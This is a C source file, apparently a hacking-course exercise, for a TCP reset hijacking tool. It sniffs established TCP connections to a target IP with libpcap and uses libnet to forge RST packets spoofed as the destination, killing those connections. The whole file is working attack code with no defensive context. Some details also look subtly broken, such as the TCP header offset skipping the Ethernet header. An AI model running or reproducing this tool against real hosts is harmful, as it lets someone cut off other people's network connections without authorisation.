#include <libnet.h>
#include <pcap.h>
#include "../include/hacking.h"

void caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);
int  set_packet_filter(pcap_t *, struct in_addr *);
void rst_hijack_fatal(const char *, const char *);

typedef struct data_pass {
    int     libnet_handle;
    libnet_t *cxt;
    u_char  *packet;
} data_pass_t;

int main(int argc, char *argv[])
{
    pcap_t             *pcap_handle;
    char               errbuf[PCAP_ERRBUF_SIZE];
    char               *device;
    u_long             target_ip;
    int                network;
    data_pass_t        critical_libnet_data;
    libnet_t           *libnet_cxt;
    pcap_if_t          *all_devices;

    if (argc != 2) {
        printf("Usage: %s <target IP>\n", argv[0]);
        return EXIT_FAILURE;
    }

    libnet_cxt = libnet_init(LIBNET_RAW4, NULL, errbuf);
    if (libnet_cxt == NULL) {
        rst_hijack_fatal("libnet_init", errbuf);
    }
    critical_libnet_data.cxt = libnet_cxt;

    target_ip = libnet_name2addr4(libnet_cxt, argv[1], LIBNET_RESOLVE);
    if (target_ip == -1) {
        rst_hijack_fatal("libnet_name2addr4", libnet_geterror(libnet_cxt));
    }

    pcap_findalldevs(&all_devices, errbuf);
    if (all_devices == NULL) {
        rst_hijack_fatal("pcap_findalldevs", errbuf);
    }
    device = all_devices->name;
    printf("+ Utilizing device: %s\n", device);

    pcap_handle = pcap_open_live(device, 128, 1, 0, errbuf);
    if (pcap_handle == NULL) {
        rst_hijack_fatal("pcap_open_live", errbuf);
    }

    network = libnet_open_raw4(libnet_cxt);
    if (network == -1) {
        rst_hijack_fatal("libnet_open_raw4", libnet_geterror(libnet_cxt));
    }
    critical_libnet_data.libnet_handle = network;

    libnet_seed_prand(libnet_cxt);

    set_packet_filter(pcap_handle, (struct in_addr *)&target_ip);

    printf("+ Resetting all TCP connections to %s on %s\n", argv[1], device);
    pcap_loop(pcap_handle, 1000, caught_packet, (u_char *)&critical_libnet_data);

    pcap_close(pcap_handle);

    return EXIT_SUCCESS;
}

/**
 * Sets a pacekt filter to look for established TCP connections to target_ip
 */
int set_packet_filter(pcap_t *pcap_handle, struct in_addr *target_ip) {
    struct bpf_program filter;
    char               filter_str[128];

    sprintf(filter_str, "tcp[tcpflags] & tcp-ack != 0 and dst host %s",
                        inet_ntoa(*target_ip));

    printf("\tDEBUG: filter string is \'%s\'\n", filter_str);
    if (pcap_compile(pcap_handle, &filter, filter_str, 0, 0) == -1) {
        rst_hijack_fatal("pcap_compile", "pcap_compile failure.\n");
    }

    if (pcap_setfilter(pcap_handle, &filter) == -1) {
        rst_hijack_fatal("pcap_setfilter", "Unable to set BPF filter");
    }

    return EXIT_SUCCESS;
}

void caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, 
                   const u_char *packet)
{
    struct libnet_ipv4_hdr *ip_hdr;
    struct libnet_tcp_hdr  *tcp_hdr;
    data_pass_t            *passed;
    u_int                   bcount;
    libnet_t                *libnet_cxt;

    passed = (data_pass_t *) user_args;
    libnet_cxt = passed->cxt;
    ip_hdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
    tcp_hdr = (struct libnet_tcp_hdr *) (packet + LIBNET_IPV4_H);

    printf("+ Resetting TCP connection from %s:%d ", inet_ntoa(ip_hdr->ip_src),
                                                     htons(tcp_hdr->th_sport));
    printf("<---> %s:%d\n", inet_ntoa(ip_hdr->ip_dst),
                            htons(tcp_hdr->th_dport));

    /**
     * Create TCP header where we masquerade as the destination sending back 
     * a RST packet to source
     * Requirements:
     *      1) Switch dest + source port to masquerade
     *      2) Use captured TCP ACK # as TCP seq
     */
    libnet_build_tcp(htons(tcp_hdr->th_dport), 
                     htons(tcp_hdr->th_sport),
                     htonl(tcp_hdr->th_ack),
                     libnet_get_prand(LIBNET_PRu32),
                     TH_RST,
                     libnet_get_prand(LIBNET_PRu16),
                     0,
                     0,
                     LIBNET_TCP_H,
                     NULL,
                     0,
                     libnet_cxt,
                     0);

    libnet_build_ipv4(LIBNET_IPV4_H,
                      IPTOS_LOWDELAY,
                      libnet_get_prand(LIBNET_PRu16),
                      0,
                      libnet_get_prand(LIBNET_PR8),
                      IPPROTO_TCP,
                      0,
                      *((u_long *)&(ip_hdr->ip_dst)),
                      *((u_long *)&(ip_hdr->ip_src)),
                      NULL,
                      0,
                      libnet_cxt,
                      0);

    bcount = libnet_write(libnet_cxt);
    if (bcount != LIBNET_IPV4_H + LIBNET_TCP_H) {
        printf("\tDEBUG: %d of %d bytes written\n", bcount,
               LIBNET_IPV4_H + LIBNET_TCP_H);
        rst_hijack_fatal("libnet_write", "Incomplete packet written.");
    }

    libnet_clear_packet(libnet_cxt);
    usleep(5000);
}

void rst_hijack_fatal(const char *failed_in, const char *errbuf) {
    printf("FATAL ERROR in %s: %s\n", failed_in, errbuf);
    exit(EXIT_FAILURE);
}